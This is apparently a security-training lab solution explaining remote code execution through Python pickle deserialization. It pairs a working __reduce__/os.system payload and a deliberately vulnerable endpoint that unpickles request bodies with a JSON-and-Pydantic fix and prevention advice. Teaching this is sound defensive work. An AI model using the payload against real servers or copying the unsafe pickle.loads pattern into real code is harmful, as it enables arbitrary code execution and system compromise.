# Lab 05 Solution: RCE via Insecure Deserialization

## How the Attack Works

Python's `pickle` module is fundamentally insecure because it executes code during deserialization. An attacker can craft a serialized object that executes arbitrary code when deserialized.

### Attack Mechanism

1. **Create a malicious class** with `__reduce__()` method
2. **Pickle the object** to binary format
3. **Send to server** at `/tools/execute-pickle` endpoint
4. **Server deserializes** with `pickle.loads()`
5. **Code executes** during deserialization — before any safety checks

### Example Payload

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        # When unpickled, this calls os.system() with the given command
        return (os.system, ("id > /tmp/pwned.txt",))

# Serialize the exploit
payload = pickle.dumps(Exploit())

# Send to server:
# POST /tools/execute-pickle with body = payload
# Server does: pickle.loads(payload)
# Code executes!
```

## Why It's Vulnerable

The server trustlessly deserializes untrusted binary data:

```python
@router.post("/execute-pickle")
async def execute_pickle(request: Request):
    body = await request.body()
    # CRITICAL: Arbitrary code execution
    obj = pickle.loads(body)  # ← Code can execute here
    return {"status": "success"}
```

## The Fix

**Rule**: Never use `pickle.loads()` on untrusted data.

### Secure Alternative: JSON Only

```python
import json
from pydantic import BaseModel

class ToolRequest(BaseModel):
    tool: str
    input: dict
    # ... other fields

@router.post("/execute-tool")
async def execute_tool(request: Request):
    try:
        # Use JSON decoder - never executes code
        data = await request.json()
        
        # Validate with Pydantic schema
        tool_request = ToolRequest.parse_obj(data)
        
        # Safe to proceed - no code executed during parsing
        result = await run_tool(tool_request)
        
        return {"status": "success", "result": result}
        
    except json.JSONDecodeError:
        return {"error": "Invalid JSON"}
    except ValidationError as e:
        return {"error": f"Invalid request: {e}"}
```

## Impact

- **Pickle RCE**: Complete system compromise
- **Credential theft**: Access environment variables, AWS credentials
- **Data exfiltration**: Read and transmit sensitive files
- **Lateral movement**: Compromise other systems using stolen credentials

## Prevention

1. **Never use pickle on untrusted input**
2. Use JSON for all external data
3. Validate all input with strict schemas
4. Run container as non-root user (limits damage)
5. Monitor for suspicious process execution

## Real-World Parallels

- **PHP**: `unserialize()` on user input
- **Java**: Unsafe deserialization (CVE-2015-4852)
- **Ruby**: YAML unsafe load
- **Python**: `pickle`, `yaml.load()`, `eval()`

All share the same fundamental flaw: **never deserialize untrusted data**.
